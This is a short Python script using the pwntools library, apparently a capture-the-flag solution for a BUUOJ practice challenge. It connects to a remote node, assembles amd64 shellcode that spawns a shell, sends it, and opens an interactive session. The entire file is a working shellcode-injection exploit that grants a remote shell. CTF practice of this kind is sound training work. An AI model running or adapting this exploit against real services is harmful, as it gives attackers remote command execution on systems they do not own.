from pwn import *


p = remote("node4.buuoj.cn", 28221)

context(os="linux", arch="amd64")

code = asm(shellcraft.sh())
p.send(code)

p.interactive()

